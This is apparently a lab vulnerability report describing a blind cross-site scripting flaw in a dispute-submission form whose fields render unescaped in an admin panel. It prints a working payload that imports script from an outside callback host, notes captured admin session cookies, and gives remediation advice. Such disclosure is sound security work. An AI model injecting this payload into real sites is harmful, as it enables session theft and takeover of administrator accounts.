## Title
Blind XSS - DisputeDesk Dispute Resolution

## Description
**Affected URL:** https://disputedesk.pwnedbox.site/

The dispute submission form accepts user-controlled input in multiple fields, including Name, Phone, Company / Merchant, and Transaction Reference. The submitted data is later displayed in the administrative interface.

A Blind XSS vulnerability was identified because the injected HTML payload triggered an external callback when the submitted dispute information was processed or viewed through the admin panel. The XSS.Report records show callbacks originating from the administrative pages, including `admin/cases.php` and `admin/index.php`.

## Steps to Reproduce
1. Open the DisputeDesk dispute submission page: https://disputedesk.pwnedbox.site/file.php.
2. Enter the supplied XSS payload into the user-controlled form fields.
3. Complete the required fields and submit the dispute.
4. Wait for an administrator to access the submitted dispute through the admin dashboard.
5. Check XSS.Report for the resulting callback.

## POC (Proof of Concept)
**Lab Address:** https://disputedesk.pwnedbox.site/

**HTTP Method:** POST

**Vulnerable Parameters:** Name, Phone, Company / Merchant, and Transaction Reference fields.

**Payload:**
```html
"><imaGE/src/onerror=import('//xss.report/c/mihir')>
```

**Request Parameter:**
```text
Name: "><imaGE/src/onerror=import('//xss.report/c/mihir')>
Phone: "><imaGE/src/onerror=import('//xss.report/c/mihir')>
Company / Merchant: "><imaGE/src/onerror=import('//xss.report/c/mihir')>
Transaction Reference: "><imaGE/src/onerror=import('//xss.report/c/mihir')>
```

**Observed Result:**

The submitted dispute appeared in the administrative dashboard. XSS.Report subsequently recorded callbacks associated with the administrative pages `admin/cases.php` and `admin/index.php`. The captured report details also show a PHP session cookie value, indicating that cookie data was included in the callback information.

**Screenshot Evidence:**
1. Dispute submission form containing the injected payload.
<img width="1917" height="968" alt="image" src="https://github.com/user-attachments/assets/040f2a84-b8d7-4f75-9d89-57375079a282" />

2. Admin dashboard displaying the submitted dispute.
<img width="1909" height="969" alt="image" src="https://github.com/user-attachments/assets/863b5b1d-946b-4846-84e1-b3e2f9108fb1" />

3. XSS.Report dashboard showing captured callbacks for DisputeDesk.
<img width="1918" height="992" alt="image" src="https://github.com/user-attachments/assets/d6a6a42e-c1c6-4029-9bed-4dd37c55c418" />

4. XSS.Report detail page showing the affected admin URL and captured request information.
<img width="1919" height="969" alt="image" src="https://github.com/user-attachments/assets/04592c3f-f8dd-4512-af5d-e080ab2e5ebe" />


## Impact
An attacker can submit a crafted dispute containing a malicious payload that executes when an administrator processes or views the submitted information.

Potential consequences include:
- Execution of attacker-controlled JavaScript in an administrator's browser.
- Exposure of sensitive information accessible to the affected browser.
- Potential session hijacking if captured session cookies are usable and not protected by appropriate cookie attributes.
- Unauthorized actions within the administrative interface, depending on the administrator's active session and application protections.

## Remediation
1. Apply context-aware output encoding to all user-submitted fields before displaying them in the administrative interface.
2. Do not render submitted values as raw HTML. Treat all dispute form input as untrusted data.
3. Validate and sanitize input on the server side, and use safe templating practices when displaying dispute details.
4. Set session cookies with appropriate `HttpOnly`, `Secure`, and `SameSite` attributes to reduce the risk of session exposure.
